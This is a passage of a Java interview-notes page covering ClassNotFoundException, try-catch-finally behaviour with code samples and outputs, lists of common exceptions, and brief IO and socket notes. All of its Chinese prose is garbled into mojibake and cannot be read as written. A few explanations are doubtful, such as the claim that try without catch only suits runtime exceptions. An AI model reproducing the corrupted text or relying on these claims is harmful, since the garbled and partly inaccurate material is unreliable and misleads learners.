<p>å¼•èµ·è¯¥å¼‚å¸¸çš„åŸå› æ˜¯ JVM æˆ– ClassLoader å°è¯•åŠ è½½æŸç±»æ—¶åœ¨å†…å­˜ä¸­æ‰¾ä¸åˆ°è¯¥ç±» çš„å®šä¹‰ï¼Œè¯¥åŠ¨ä½œå‘ç”Ÿåœ¨è¿è¡ŒæœŸé—´ï¼Œå³ç¼–è¯‘æ—¶è¯¥ç±»å­˜åœ¨ï¼Œä½†æ˜¯åœ¨è¿è¡Œæ—¶å´æ‰¾ä¸åˆ° äº†ï¼Œå¯èƒ½æ˜¯å˜å¼‚åè¢«åˆ é™¤äº†ç­‰åŸå› å¯¼è‡´ï¼› </p>
<p>ClassNotFoundException æ˜¯ä¸€ä¸ªå—æŸ¥å¼‚å¸¸ï¼Œéœ€è¦æ˜¾å¼åœ°ä½¿ç”¨ try-catch å¯¹å…¶è¿›è¡Œæ•è·å’Œå¤„ç†ï¼Œæˆ–åœ¨æ–¹æ³•ç­¾åä¸­ç”¨ throws å…³é”®å­—è¿›è¡Œå£°æ˜ã€‚å½“ä½¿ç”¨  Class.forName, ClassLoader.loadClass æˆ– ClassLoader.findSystemClass åŠ¨æ€åŠ è½½ç±»åˆ°å†…å­˜çš„æ—¶å€™ï¼Œé€šè¿‡ä¼ å…¥çš„ç±»è·¯å¾„å‚æ•°æ²¡æœ‰æ‰¾åˆ°è¯¥ç±»ï¼Œå°±ä¼šæŠ›å‡ºè¯¥å¼‚å¸¸ï¼›å¦ä¸€ç§æŠ›å‡ºè¯¥å¼‚å¸¸çš„å¯èƒ½åŸå› æ˜¯æŸä¸ªç±»å·²ç»ç”±ä¸€ä¸ªç±»åŠ è½½å™¨åŠ è½½è‡³å†…å­˜ä¸­ï¼Œ å¦ä¸€ä¸ªåŠ è½½å™¨åˆå°è¯•å»åŠ è½½å®ƒã€‚ </p>
<h2 id="7-try-catch-finally-ä¸­å“ªä¸ªéƒ¨åˆ†å¯ä»¥çœç•¥ï¼Ÿ"><a href="#7-try-catch-finally-ä¸­å“ªä¸ªéƒ¨åˆ†å¯ä»¥çœç•¥ï¼Ÿ" class="headerlink" title="7. try-catch-finally ä¸­å“ªä¸ªéƒ¨åˆ†å¯ä»¥çœç•¥ï¼Ÿ"></a>7. try-catch-finally ä¸­å“ªä¸ªéƒ¨åˆ†å¯ä»¥çœç•¥ï¼Ÿ</h2><p>ç­”ï¼šcatch å¯ä»¥çœç•¥ </p>
<p>**åŸå›  **</p>
<p>æ›´ä¸ºä¸¥æ ¼çš„è¯´æ³•å…¶å®æ˜¯ï¼štryåªé€‚åˆå¤„ç†è¿è¡Œæ—¶å¼‚å¸¸ï¼Œtry+catché€‚åˆå¤„ç†è¿è¡Œæ—¶ å¼‚å¸¸+æ™®é€šå¼‚å¸¸ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ åªç”¨tryå»å¤„ç†æ™®é€šå¼‚å¸¸å´ä¸åŠ ä»¥catchå¤„ç†ï¼Œç¼–è¯‘æ˜¯é€šä¸è¿‡çš„ï¼Œå› ä¸ºç¼–è¯‘å™¨ç¡¬æ€§è§„å®šï¼Œæ™®é€šå¼‚å¸¸å¦‚æœé€‰æ‹©æ•è·ï¼Œåˆ™å¿…é¡»ç”¨ catchæ˜¾ç¤ºå£°æ˜ä»¥ä¾¿è¿›ä¸€æ­¥å¤„ç†ã€‚è€Œè¿è¡Œæ—¶å¼‚å¸¸åœ¨ç¼–è¯‘æ—¶æ²¡æœ‰å¦‚æ­¤è§„å®šï¼Œæ‰€ä»¥ catchå¯ä»¥çœç•¥ï¼Œä½ åŠ ä¸Šcatchç¼–è¯‘å™¨ä¹Ÿè§‰å¾—æ— å¯åšéã€‚ </p>
<p>ç†è®ºä¸Šï¼Œç¼–è¯‘å™¨çœ‹ä»»ä½•ä»£ç éƒ½ä¸é¡ºçœ¼ï¼Œéƒ½è§‰å¾—å¯èƒ½æœ‰æ½œåœ¨çš„é—®é¢˜ï¼Œæ‰€ä»¥ä½ å³ä½¿å¯¹æ‰€æœ‰ä»£ç åŠ ä¸Štryï¼Œä»£ç åœ¨è¿è¡ŒæœŸæ—¶ä¹Ÿåªä¸è¿‡æ˜¯åœ¨æ­£å¸¸è¿è¡Œçš„åŸºç¡€ä¸ŠåŠ ä¸€å±‚çš®ã€‚ ä½†æ˜¯ä½ ä¸€æ—¦å¯¹ä¸€æ®µä»£ç åŠ ä¸Štryï¼Œå°±ç­‰äºæ˜¾ç¤ºåœ°æ‰¿è¯ºç¼–è¯‘å™¨ï¼Œå¯¹è¿™æ®µä»£ç å¯èƒ½æŠ› å‡ºçš„å¼‚å¸¸è¿›è¡Œæ•è·è€Œéå‘ä¸ŠæŠ›å‡ºå¤„ç†ã€‚å¦‚æœæ˜¯æ™®é€šå¼‚å¸¸ï¼Œç¼–è¯‘å™¨è¦æ±‚å¿…é¡»ç”¨ catchæ•è·ä»¥ä¾¿è¿›ä¸€æ­¥å¤„ç†ï¼›å¦‚æœè¿è¡Œæ—¶å¼‚å¸¸ï¼Œæ•è·ç„¶åä¸¢å¼ƒå¹¶ä¸”+finallyæ‰«å°¾ å¤„ç†ï¼Œæˆ–è€…åŠ ä¸Šcatchæ•è·ä»¥ä¾¿è¿›ä¸€æ­¥å¤„ç†ã€‚ </p>
<p>è‡³äºåŠ ä¸Šfinallyï¼Œåˆ™æ˜¯åœ¨ä¸ç®¡æœ‰æ²¡æ•è·å¼‚å¸¸ï¼Œéƒ½è¦è¿›è¡Œçš„â€œæ‰«å°¾â€å¤„ç†ã€‚  </p>
<h2 id="8-try-catch-finally-ä¸­ï¼Œå¦‚æœ-catch-ä¸­-return-äº†ï¼Œ-finally-è¿˜ä¼šæ‰§è¡Œå—ï¼Ÿ"><a href="#8-try-catch-finally-ä¸­ï¼Œå¦‚æœ-catch-ä¸­-return-äº†ï¼Œ-finally-è¿˜ä¼šæ‰§è¡Œå—ï¼Ÿ" class="headerlink" title="8. try-catch-finally ä¸­ï¼Œå¦‚æœ catch ä¸­ return äº†ï¼Œ finally è¿˜ä¼šæ‰§è¡Œå—ï¼Ÿ"></a>8. try-catch-finally ä¸­ï¼Œå¦‚æœ catch ä¸­ return äº†ï¼Œ finally è¿˜ä¼šæ‰§è¡Œå—ï¼Ÿ</h2><p>ç­”ï¼šä¼šæ‰§è¡Œï¼Œåœ¨ return å‰æ‰§è¡Œã€‚ </p>
<p><strong>æ³¨æ„ï¼š</strong>åœ¨ finally ä¸­æ”¹å˜è¿”å›å€¼çš„åšæ³•æ˜¯ä¸å¥½çš„ï¼Œå› ä¸ºå¦‚æœå­˜åœ¨ finally ä»£ç å—ï¼Œ tryä¸­çš„ return è¯­å¥ä¸ä¼šç«‹é©¬è¿”å›è°ƒç”¨è€…ï¼Œè€Œæ˜¯è®°å½•ä¸‹è¿”å›å€¼å¾… finally ä»£ç å— æ‰§è¡Œå®Œæ¯•ä¹‹åå†å‘è°ƒç”¨è€…è¿”å›å…¶å€¼ï¼Œç„¶åå¦‚æœåœ¨ finally ä¸­ä¿®æ”¹äº†è¿”å›å€¼ï¼Œå°±ä¼š è¿”å›ä¿®æ”¹åçš„å€¼ã€‚æ˜¾ç„¶ï¼Œåœ¨ finally ä¸­è¿”å›æˆ–è€…ä¿®æ”¹è¿”å›å€¼ä¼šå¯¹ç¨‹åºé€ æˆå¾ˆå¤§çš„ å›°æ‰°ï¼ŒC#ä¸­ç›´æ¥ç”¨ç¼–è¯‘é”™è¯¯çš„æ–¹å¼æ¥é˜»æ­¢ç¨‹åºå‘˜å¹²è¿™ç§é¾Œé¾Šçš„äº‹æƒ…ï¼ŒJava ä¸­ä¹Ÿ å¯ä»¥é€šè¿‡æå‡ç¼–è¯‘å™¨çš„è¯­æ³•æ£€æŸ¥çº§åˆ«æ¥äº§ç”Ÿè­¦å‘Šæˆ–é”™è¯¯ã€‚ </p>
<p><strong>ä»£ç ç¤ºä¾‹1ï¼š</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="number">2</span>  <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>; </span><br><span class="line"><span class="number">3</span>  <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">4</span>  System.out.println(a / <span class="number">0</span>); </span><br><span class="line"><span class="number">5</span>  a = <span class="number">20</span>; </span><br><span class="line"><span class="number">6</span>  &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123; </span><br><span class="line"><span class="number">7</span>  a = <span class="number">30</span>; </span><br><span class="line"><span class="number">8</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">9</span>  <span class="comment">/* </span></span><br><span class="line"><span class="comment">10  * return a åœ¨ç¨‹åºæ‰§è¡Œåˆ°è¿™ä¸€æ­¥çš„æ—¶å€™ï¼Œè¿™é‡Œä¸æ˜¯return a è€Œæ˜¯ return 30ï¼›è¿™ä¸ªè¿”å›è·¯å¾„å°±å½¢æˆäº† </span></span><br><span class="line"><span class="comment">11  * ä½†æ˜¯å‘¢ï¼Œå®ƒå‘ç°åé¢è¿˜æœ‰finallyï¼Œæ‰€ä»¥ç»§ç»­æ‰§è¡Œfinallyçš„å†…å®¹ï¼Œa=40 </span></span><br><span class="line"><span class="comment">12  * å†æ¬¡å›åˆ°ä»¥å‰çš„è·¯å¾„,ç»§ç»­èµ°return 30ï¼Œå½¢æˆè¿”å›è·¯å¾„ä¹‹åï¼Œè¿™é‡Œçš„aå°±ä¸æ˜¯aå˜é‡äº†ï¼Œè€Œæ˜¯å¸¸é‡30 </span></span><br><span class="line"><span class="comment">13  */</span> </span><br><span class="line"><span class="number">14</span>  &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line"><span class="number">15</span>  a = <span class="number">40</span>; </span><br><span class="line"><span class="number">16</span>  &#125; </span><br><span class="line"><span class="number">17</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">18</span> &#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ‰§è¡Œç»“æœï¼š</strong>30 </p>
<p><strong>ä»£ç ç¤ºä¾‹2ï¼š</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getInt</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="number">2</span>  <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>; </span><br><span class="line"><span class="number">3</span>  <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">4</span>  System.out.println(a / <span class="number">0</span>); </span><br><span class="line"><span class="number">5</span>  a = <span class="number">20</span>; </span><br><span class="line"><span class="number">6</span>  &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123; </span><br><span class="line"><span class="number">7</span>  a = <span class="number">30</span>; </span><br><span class="line"><span class="number">8</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">9</span>  &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line"><span class="number">10</span>  a = <span class="number">40</span>; </span><br><span class="line"><span class="number">11</span>  <span class="comment">//å¦‚æœè¿™æ ·ï¼Œå°±åˆé‡æ–°å½¢æˆäº†ä¸€æ¡è¿”å›è·¯å¾„ï¼Œç”±äºåªèƒ½é€šè¿‡1ä¸ªreturnè¿”å›ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿”å›40 </span></span><br><span class="line"><span class="number">12</span>  <span class="keyword">return</span> a; </span><br><span class="line"><span class="number">13</span>  &#125;</span><br><span class="line"><span class="number">14</span> </span><br><span class="line"><span class="number">15</span> &#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ‰§è¡Œç»“æœï¼š</strong>40  </p>
<h2 id="9-ç±»-ExampleA-ç»§æ‰¿-Exceptionï¼Œç±»-ExampleB-ç»§æ‰¿-ExampleAã€‚"><a href="#9-ç±»-ExampleA-ç»§æ‰¿-Exceptionï¼Œç±»-ExampleB-ç»§æ‰¿-ExampleAã€‚" class="headerlink" title="9. ç±» ExampleA ç»§æ‰¿ Exceptionï¼Œç±» ExampleB ç»§æ‰¿ ExampleAã€‚"></a>9. ç±» ExampleA ç»§æ‰¿ Exceptionï¼Œç±» ExampleB ç»§æ‰¿ ExampleAã€‚</h2><p>æœ‰å¦‚ä¸‹ä»£ç ç‰‡æ–­ï¼š </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">2</span>  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExampleB</span>(<span class="string">&quot;b&quot;</span>) </span><br><span class="line"><span class="number">3</span> &#125; <span class="keyword">catch</span>ï¼ˆExampleA eï¼‰&#123; </span><br><span class="line"><span class="number">4</span>  System.out.println(<span class="string">&quot;ExampleA&quot;</span>); </span><br><span class="line"><span class="number">5</span> &#125; <span class="keyword">catch</span>ï¼ˆException eï¼‰&#123; </span><br><span class="line"><span class="number">6</span>  System.out.println(<span class="string">&quot;Exception&quot;</span>); </span><br><span class="line"><span class="number">7</span> &#125; </span><br></pre></td></tr></table></figure>

<p>è¯·é—®æ‰§è¡Œæ­¤æ®µä»£ç çš„è¾“å‡ºæ˜¯ä»€ä¹ˆï¼Ÿ </p>
<p><strong>ç­”ï¼š</strong> </p>
<p>è¾“å‡ºï¼šExampleAã€‚ï¼ˆæ ¹æ®é‡Œæ°ä»£æ¢åŸåˆ™[èƒ½ä½¿ç”¨çˆ¶ç±»å‹çš„åœ°æ–¹ä¸€å®šèƒ½ä½¿ç”¨å­ç±»å‹]ï¼ŒæŠ“å– ExampleA ç±»å‹å¼‚å¸¸çš„ catchå—èƒ½å¤ŸæŠ“ä½ try å—ä¸­æŠ›å‡ºçš„ ExampleB  ç±»å‹çš„å¼‚å¸¸ï¼‰ </p>
<p>é¢è¯•é¢˜ - è¯´å‡ºä¸‹é¢ä»£ç çš„è¿è¡Œç»“æœã€‚ï¼ˆæ­¤é¢˜çš„å‡ºå¤„æ˜¯ã€ŠJava ç¼–ç¨‹æ€æƒ³ã€‹ä¸€ä¹¦ï¼‰ </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">class</span> <span class="title class_">Annoyance</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123; </span><br><span class="line"><span class="number">2</span> &#125; </span><br><span class="line"><span class="number">3</span> <span class="keyword">class</span> <span class="title class_">Sneeze</span> <span class="keyword">extends</span> <span class="title class_">Annoyance</span> &#123; </span><br><span class="line"><span class="number">4</span> &#125; </span><br><span class="line"><span class="number">5</span> <span class="keyword">class</span> <span class="title class_">Human</span> &#123; </span><br><span class="line"><span class="number">6</span>  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> </span><br><span class="line"><span class="number">7</span>  <span class="keyword">throws</span> Exception &#123; </span><br><span class="line"><span class="number">8</span>  <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">9</span>  <span class="keyword">try</span> &#123; </span><br><span class="line"><span class="number">10</span>  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Sneeze</span>(); </span><br><span class="line"><span class="number">11</span>  &#125; <span class="keyword">catch</span> ( Annoyance a ) &#123; </span><br><span class="line"><span class="number">12</span>  System.out.println(<span class="string">&quot;Caught Annoyance&quot;</span>); </span><br><span class="line"><span class="number">13</span>  <span class="keyword">throw</span> a; </span><br><span class="line"><span class="number">14</span>  &#125; </span><br><span class="line"><span class="number">15</span>  &#125; <span class="keyword">catch</span> ( Sneeze s ) &#123; </span><br><span class="line"><span class="number">16</span>  System.out.println(<span class="string">&quot;Caught Sneeze&quot;</span>); </span><br><span class="line"><span class="number">17</span>  <span class="keyword">return</span> ; </span><br><span class="line"><span class="number">18</span>  &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line"><span class="number">19</span>  System.out.println(<span class="string">&quot;Hello World!&quot;</span>); </span><br><span class="line"><span class="number">20</span>  &#125; </span><br><span class="line"><span class="number">21</span>  &#125; </span><br><span class="line"><span class="number">22</span> &#125;</span><br></pre></td></tr></table></figure>

<p> <strong>ç»“æœ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 Caught Annoyance </span><br><span class="line">2 Caught Sneeze </span><br><span class="line">3 Hello World! </span><br></pre></td></tr></table></figure>

<h2 id="10-å¸¸è§çš„-RuntimeException-æœ‰å“ªäº›ï¼Ÿ"><a href="#10-å¸¸è§çš„-RuntimeException-æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="10. å¸¸è§çš„ RuntimeException æœ‰å“ªäº›ï¼Ÿ"></a>10. å¸¸è§çš„ RuntimeException æœ‰å“ªäº›ï¼Ÿ</h2><ul>
<li>ClassCastException(ç±»è½¬æ¢å¼‚å¸¸) </li>
<li>IndexOutOfBoundsException(æ•°ç»„è¶Šç•Œ) </li>
<li>NullPointerException(ç©ºæŒ‡é’ˆ) </li>
<li>ArrayStoreException(æ•°æ®å­˜å‚¨å¼‚å¸¸ï¼Œæ“ä½œæ•°ç»„æ—¶ç±»å‹ä¸ä¸€è‡´) </li>
<li>è¿˜æœ‰IOæ“ä½œçš„BufferOverflowExceptionå¼‚å¸¸</li>
</ul>
<h2 id="11-Javaå¸¸è§å¼‚å¸¸æœ‰å“ªäº›"><a href="#11-Javaå¸¸è§å¼‚å¸¸æœ‰å“ªäº›" class="headerlink" title="11. Javaå¸¸è§å¼‚å¸¸æœ‰å“ªäº›"></a>11. Javaå¸¸è§å¼‚å¸¸æœ‰å“ªäº›</h2><p>java.lang.IllegalAccessErrorï¼šè¿æ³•è®¿é—®é”™è¯¯ã€‚å½“ä¸€ä¸ªåº”ç”¨è¯•å›¾è®¿é—®ã€ä¿®æ”¹æŸä¸ªç±»çš„åŸŸï¼ˆFieldï¼‰æˆ–è€…è°ƒç”¨å…¶æ–¹æ³•ï¼Œä½†æ˜¯åˆè¿ååŸŸæˆ–æ–¹æ³•çš„å¯è§æ€§å£°æ˜ï¼Œåˆ™æŠ›å‡ºè¯¥å¼‚å¸¸ã€‚</p>
<p>java.lang.InstantiationErrorï¼šå®ä¾‹åŒ–é”™è¯¯ã€‚å½“ä¸€ä¸ªåº”ç”¨è¯•å›¾é€šè¿‡Javaçš„newæ“ä½œç¬¦æ„é€ ä¸€ä¸ªæŠ½è±¡ç±»æˆ–è€…æ¥å£æ—¶æŠ›å‡ºè¯¥å¼‚å¸¸.</p>
<p>java.lang.OutOfMemoryErrorï¼šå†…å­˜ä¸è¶³é”™è¯¯ã€‚å½“å¯ç”¨å†…å­˜ä¸è¶³ä»¥è®©Javaè™šæ‹Ÿæœºåˆ†é…ç»™ä¸€ä¸ªå¯¹è±¡æ—¶æŠ›å‡ºè¯¥é”™è¯¯ã€‚</p>
<p>java.lang.StackOverflowErrorï¼šå †æ ˆæº¢å‡ºé”™è¯¯ã€‚å½“ä¸€ä¸ªåº”ç”¨é€’å½’è°ƒç”¨çš„å±‚æ¬¡å¤ªæ·±è€Œå¯¼è‡´å †æ ˆæº¢å‡ºæˆ–è€…é™·å…¥æ­»å¾ªç¯æ—¶æŠ›å‡ºè¯¥é”™è¯¯ã€‚</p>
<p>java.lang.ClassCastExceptionï¼šç±»é€ å‹å¼‚å¸¸ã€‚å‡è®¾æœ‰ç±»Aå’ŒBï¼ˆAä¸æ˜¯Bçš„çˆ¶ç±»æˆ–å­ç±»ï¼‰ï¼ŒOæ˜¯Açš„å®ä¾‹ï¼Œé‚£ä¹ˆå½“å¼ºåˆ¶å°†Oæ„é€ ä¸ºç±»Bçš„å®ä¾‹æ—¶æŠ›å‡ºè¯¥å¼‚å¸¸ã€‚è¯¥å¼‚å¸¸ç»å¸¸è¢«ç§°ä¸ºå¼ºåˆ¶ç±»å‹è½¬æ¢å¼‚å¸¸ã€‚</p>
<p>java.lang.ClassNotFoundExceptionï¼šæ‰¾ä¸åˆ°ç±»å¼‚å¸¸ã€‚å½“åº”ç”¨è¯•å›¾æ ¹æ®å­—ç¬¦ä¸²å½¢å¼çš„ç±»åæ„é€ ç±»ï¼Œè€Œåœ¨éå†CLASSPAHä¹‹åæ‰¾ä¸åˆ°å¯¹åº”åç§°çš„classæ–‡ä»¶æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚ java.lang.ArithmeticExceptionï¼šç®—æœ¯æ¡ä»¶å¼‚å¸¸ã€‚è­¬å¦‚ï¼šæ•´æ•°é™¤é›¶ç­‰ã€‚</p>
<p>java.lang.ArrayIndexOutOfBoundsExceptionï¼šæ•°ç»„ç´¢å¼•è¶Šç•Œå¼‚å¸¸ã€‚å½“å¯¹æ•°ç»„çš„ç´¢å¼•å€¼ä¸ºè´Ÿæ•°æˆ–å¤§äºç­‰äºæ•°ç»„å¤§å°æ—¶æŠ›å‡ºã€‚</p>
<p>java.lang.IndexOutOfBoundsExceptionï¼šç´¢å¼•è¶Šç•Œå¼‚å¸¸ã€‚å½“è®¿é—®æŸä¸ªåºåˆ—çš„ç´¢å¼•å€¼å°äº0æˆ–å¤§äºç­‰äºåºåˆ—å¤§å°æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚ java.lang.InstantiationExceptionï¼šå®ä¾‹åŒ–å¼‚å¸¸ã€‚å½“è¯•å›¾é€šè¿‡newInstance()æ–¹æ³•åˆ›å»ºæŸä¸ªç±»çš„å®ä¾‹ï¼Œè€Œè¯¥ç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»æˆ–æ¥å£æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚</p>
<p>java.lang.NoSuchFieldExceptionï¼šå±æ€§ä¸å­˜åœ¨å¼‚å¸¸ã€‚å½“è®¿é—®æŸä¸ªç±»çš„ä¸å­˜åœ¨çš„å±æ€§æ—¶æŠ›å‡ºè¯¥å¼‚å¸¸ã€‚</p>
<p>java.lang.NoSuchMethodExceptionï¼šæ–¹æ³•ä¸å­˜åœ¨å¼‚å¸¸ã€‚å½“è®¿é—®æŸä¸ªç±»çš„ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶æŠ›å‡ºè¯¥å¼‚å¸¸ã€‚</p>
<p>java.lang.NullPointerExceptionï¼šç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚å½“åº”ç”¨è¯•å›¾åœ¨è¦æ±‚ä½¿ç”¨å¯¹è±¡çš„åœ°æ–¹ä½¿ç”¨äº†nullæ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚è­¬å¦‚ï¼šè°ƒç”¨nullå¯¹è±¡çš„å®ä¾‹æ–¹æ³•ã€è®¿é—®nullå¯¹è±¡çš„å±æ€§ã€è®¡ç®—nullå¯¹è±¡çš„é•¿åº¦ã€ä½¿ç”¨throwè¯­å¥æŠ›å‡ºnullç­‰ç­‰ã€‚</p>
<p>java.lang.NumberFormatExceptionï¼šæ•°å­—æ ¼å¼å¼‚å¸¸ã€‚å½“è¯•å›¾å°†ä¸€ä¸ªStringè½¬æ¢ä¸ºæŒ‡å®šçš„æ•°å­—ç±»å‹ï¼Œè€Œè¯¥å­—ç¬¦ä¸²ç¡®ä¸æ»¡è¶³æ•°å­—ç±»å‹è¦æ±‚çš„æ ¼å¼æ—¶ï¼ŒæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚</p>
<p>java.lang.StringIndexOutOfBoundsExceptionï¼šå­—ç¬¦ä¸²ç´¢å¼•è¶Šç•Œå¼‚å¸¸ã€‚å½“ä½¿ç”¨ç´¢å¼•å€¼è®¿é—®æŸä¸ªå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œè€Œè¯¥ç´¢å¼•å€¼å°äº0æˆ–å¤§äºç­‰äºåºåˆ—å¤§å°æ—¶,æŠ›å‡ºè¯¥å¼‚å¸¸</p>
<h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><p>java bufferä¸€èˆ¬æ¯”æ™®é€šioæµå¿«ï¼Œå› ä¸ºæ™®é€šio10bä¹Ÿè°ƒç”¨ç³»ç»Ÿè°ƒç”¨å†™å›ï¼Œè€Œbufferé›†é½8KBæ‰è°ƒç”¨ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨</p>
<p>æœ‰äº›å¯¹è±¡è‡ªå·±èƒ½æ§åˆ¶å°±å¯ä»¥åˆ†é…å †å†…å†…å­˜ï¼ˆjvmå †é‡Œçš„å­—èŠ‚æ•°ç»„ï¼‰ï¼Œæœ‰äº›æ—¶å€™åªèƒ½ä½¿ç”¨å †å†…å†…å­˜ï¼ˆjvmå †å¤–ï¼Œjavaè¿›ç¨‹çš„å †å†…ï¼‰ï¼ˆä½ ä¸èƒ½æ§åˆ¶ï¼‰ï¼›éƒ½è¦èµ°ç³»ç»Ÿè°ƒç”¨</p>
<p>mmapå¯ä»¥çœä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨</p>
<p>ä¸ºä»€ä¹ˆè®¾è®¡pagecacheï¼Ÿ</p>
<p>æé€Ÿï¼Œå‡å°‘ç¡¬ä»¶ioè°ƒç”¨ï¼Œä¼˜å…ˆä½¿ç”¨å†…å­˜ï¼›</p>
<p>å¦‚æœåªæ˜¯new ä¸€ä¸ªsocketä¸º5ï¼Œä¸æ‰§è¡Œacceptä¹Ÿèƒ½å»ºç«‹è¿æ¥ï¼Œåªæ˜¯æ²¡æœ‰åˆ†é…æ–‡ä»¶æè¿°ç¬¦å»æ¥å—ï¼Œåªæ˜¯å»ºç«‹è¿æ¥çš„çŠ¶æ€ï¼Œè¿˜èƒ½ç›¸äº’å‘é€æ•°æ®åŒ…ï¼Œä½†æ˜¯æ²¡æœ‰åˆ†é…è¿›ç¨‹å»å¤„ç†ï¼Œæ–‡ä»¶æè¿°ç¬¦æ²¡æœ‰åˆ†é…ç»™å¯¹åº”çš„è¿›ç¨‹ï¼›  å¦‚æœè¿™ä¸ªæ—¶å€™æ‰§è¡ŒaccpetæŠŠè¿™ä¸ªè¿æ¥åˆ†é…ç»™å¯¹åº”çš„è¿›ç¨‹ï¼Œä¹‹å‰å‘çš„ä¸œè¥¿ä¹Ÿèƒ½æ¥å—åˆ°ã€‚</p>
<p>é¢å‘è¿æ¥ï¼Œä¸‰æ¬¡æ¡æ‰‹åå†…æ ¸å¼€è¾Ÿèµ„æºï¼Œè¿™ä¸ªèµ„æºä»£è¡¨äº†åŒæ–¹å»ºç«‹äº†è¿æ¥</p>
<p>socketæ˜¯å››å…ƒç»„ï¼Œåªè¦èƒ½å”¯ä¸€æ ‡è¯†å³å¯</p>
<p>ä¸åŒè¿›ç¨‹ä¹‹é—´çš„fdå¯ä»¥ç›¸åŒï¼Œ è¿›ç¨‹é‡Œçš„fdä¸èƒ½ç›¸åŒï¼Œè¿›ç¨‹é—´æ˜¯éš”ç¦»çš„ï¼›</p>
<p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç›‘å¬å¤šä¸ªç«¯å£å·ï¼Œnew ä¸€ä¸ªsocketç›‘å¬ä¸€ä¸ªç«¯å£å·</p>
<p>Back_log &#x3D; 2, è¡¨ç¤ºæœ€å¤šåªæœ‰2ä¸ªæ²¡æœ‰è¿›ç¨‹è®¤é¢†çš„socketè¿æ¥ï¼Œå¦‚æœè¶…è¿‡äº†å°±ä¼šæ˜¾ç¤ºsynâ€”recvçŠ¶æ€ï¼ŒæœåŠ¡ä¸å›å¤synåŒ…ï¼Œæˆ–è€…å‘çš„åŒ…ä¸¢å¤±éƒ½ä¼šæ˜¯è¿™ä¸ªçŠ¶æ€ï¼Œæ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯çš„ackéƒ½ä¼šæ˜¯è¿™ä¸ªçŠ¶æ€ã€‚</p>
<p>&amp;9 æ˜¯æŒ‡9è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦</p>
<p>ä¸åŠ çš„è¯å°±æ˜¯9è¿™ä¸ªæ–‡ä»¶</p>
<p>windowså¯ä»¥æ”¯æŒaioï¼Œlinuxå‡ºäºå®‰å…¨è€ƒè™‘æ²¡æœ‰åšè¿™ä¸ªï¼Œå†…æ ¸æ›´ç²¾ç®€</p>
<p>çº¿ç¨‹æ± å¯ä»¥çœä¸‹cloneçš„æ—¶é—´ï¼Œå…ˆcloneå¥½ç›´æ¥ç”¨ </p>
<p>rootç”¨æˆ·ä¸å—è¿æ¥æ•°é™åˆ¶ï¼Œæ™®é€šç”¨æˆ·å—è¿æ¥æ•°é™åˆ¶ï¼›</p>
<p><a href="https://www.cnblogs.com/javaguide/p/io.html">https://www.cnblogs.com/javaguide/p/io.html</a></p>
<p><a href="https://blog.csdn.net/weixin_36364419/article/details/114238400">https://blog.csdn.net/weixin_36364419/article/details/114238400</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1488087">https://cloud.tencent.com/developer/article/1488087</a></p>
<p><a href="https://www.cnblogs.com/crazymakercircle/p/10225159.html">https://www.cnblogs.com/crazymakercircle/p/10225159.html</a></p>
<p><a href="https://llc687.top/post/%E5%A6%82%E4%BD%95%E5%AE%8C%E6%88%90%E4%B8%80%E6%AC%A1-io/#gsc.tab=0">å¦‚ä½•å®Œæˆä¸€æ¬¡IO</a></p>
